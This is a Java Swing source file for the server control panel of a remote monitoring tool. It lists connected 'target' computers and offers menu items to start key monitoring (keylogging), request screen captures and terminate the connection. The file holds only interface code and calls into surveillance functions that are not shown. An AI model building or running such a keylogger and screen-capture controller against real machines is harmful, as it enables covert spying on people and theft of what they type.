package gui;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;

import main.RemoteMonitorServer;
import net.PacketHeader;

/**
 * Contains all GUI components to be displayed on the frame 
 * @author Caleb Choi
 */
public class ServerPanel extends JPanel implements ActionListener {

	// Buttons under list
	protected static final int BUTTON_HEIGHT = 25;
	private JButton clearDead;
	private JButton clearAll;

	// List
	protected static final int LIST_WIDTH = 350;
	protected static final int LIST_HEIGHT = ServerFrame.WINDOW_HEIGHT - 15 - (BUTTON_HEIGHT * 2);
	private DefaultListModel<InetAddress> listModel;
	private JList<InetAddress> clientList;
	private JScrollPane clientListScroll;

	// Popup menu
	private JPopupMenu popupMenu;
	private JMenuItem menuKeyl, menuPict, menuKill;

	// Side display panel
	private SidePanel sidePanel;

	public ServerPanel() throws UnknownHostException {

		// Setup panel settings
		setPreferredSize(new Dimension(ServerFrame.WINDOW_WIDTH, ServerFrame.WINDOW_HEIGHT));
		setLayout(null);

		// Creates list components and settings
		clearDead = new JButton("Force clear dead connections"); 
		clearAll = new JButton("Clear all connections"); 
		listModel = new DefaultListModel<InetAddress>();
		clientList = new JList<InetAddress>(listModel);
		clientList.setCellRenderer(new ClientListRenderer());
		clientListScroll = new JScrollPane(clientList);
		//		listModel.addElement(InetAddress.getLocalHost());

		// Prepares the popup menu for when the user right clicks on an element
		popupMenu = new JPopupMenu();
		popupMenu.add(menuKeyl = new JMenuItem("Start key monitoring"));
		popupMenu.add(menuPict = new JMenuItem("Request screen capture"));
		popupMenu.add(new JPopupMenu.Separator());
		popupMenu.add(menuKill = new JMenuItem("Terminate communications"));

		// Adds the side panel
		sidePanel = new SidePanel(new String[] {"Run the client stub on a target computer to connect!", 
				"Once connected, right click on any entry in the list to the left to execute various functions",
				"",
				"Your internal server IP is " + InetAddress.getLocalHost().getHostAddress() + ", with hostname " + InetAddress.getLocalHost().getHostName(),
		});

		// Sets up the various action listeners
		// Right click mouse listener for the right click menu on the client list
		clientList.addMouseListener(new MouseAdapter() {
			public void mouseClicked(MouseEvent me) {

				// If right mouse button is clicked and something's selected
				if (SwingUtilities.isRightMouseButton(me) && !clientList.isSelectionEmpty())
					popupMenu.show(clientList, me.getX(), me.getY());
			}
		});
		// Adds the action listeners to the buttons under the list
		clearDead.addActionListener(this);
		clearAll.addActionListener(this);
		// Adds the action listener to menu components
		menuKeyl.addActionListener(this);
		menuPict.addActionListener(this);
		menuKill.addActionListener(this);

		// Sets bounds and adds all the components
		clientListScroll.setBounds(15, 15, LIST_WIDTH, LIST_HEIGHT);
		clearDead.setBounds(15, 15 + LIST_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
		clearAll.setBounds(15, 15 + LIST_HEIGHT + BUTTON_HEIGHT, LIST_WIDTH, BUTTON_HEIGHT);
		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (55 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
		add(clientListScroll);
		add(clearDead);
		add(clearAll);
		add(sidePanel);
	}

	/**
	 * Resets the side panel to an empty blank panel
	 */
	public void resetTextArea() {
		remove(sidePanel);
		sidePanel = new SidePanel(new String[0]);
		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (55 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
		add(sidePanel);
		revalidate();
		repaint();
	}

	/**
	 * Resets the side panel to a specified image
	 * @param img Image to be displayed
	 */
	public void resetPictureArea(BufferedImage img) {
		remove(sidePanel);
		
		// Ensures there's actually a picture to draw. If not, just show a error text field
		if (img != null)
			sidePanel = new SidePanel(img);
		else sidePanel = new SidePanel(new String[] {"Client was unable to take a screenshot! Sorry!"});
		
		sidePanel.setBounds(LIST_WIDTH + 30, 15, ServerFrame.WINDOW_WIDTH - (55 + LIST_WIDTH), ServerFrame.WINDOW_HEIGHT - 15);
		add(sidePanel);
		revalidate();
		repaint();
	}

	/**
	 * Updates the list of connected clients
	 */
	public void updateList() {
		// Gets list of connected clients
		ArrayList<InetAddress> connections = RemoteMonitorServer.getConnectionList();

		// Removes all elements in current list, then adds current connections to it
		listModel.clear();
		for (int i = 0; i < connections.size(); i++)
			listModel.addElement(connections.get(i));
	}

	@Override
	public void actionPerformed(ActionEvent e) {

		// Sends the appropriate request depending on what element of the popup the user selected
		// Also I totally get that this is super lazy, but it works deliciously so whatever
		if (e.getSource() == menuKeyl) {
			resetTextArea();
			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KEYL);
		} else if (e.getSource() == menuPict)
			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.PICT);
		else if (e.getSource() == menuKill)
			RemoteMonitorServer.requestOperation(clientList.getSelectedValue(), PacketHeader.KILL);
		else if (e.getSource() == clearDead)
			RemoteMonitorServer.removeDeadConnections();
		else if (e.getSource() == clearAll) {
			if (ServerDialog.showClearAllDialog() == 0)
				RemoteMonitorServer.removeAllConnections();
		}
	}

	/**
	 * Gets the side panel to add the text onto the text field if that exists
	 * @param key Text to add onto the text area
	 */
	public void addText(String key) {sidePanel.addText(key);}
}
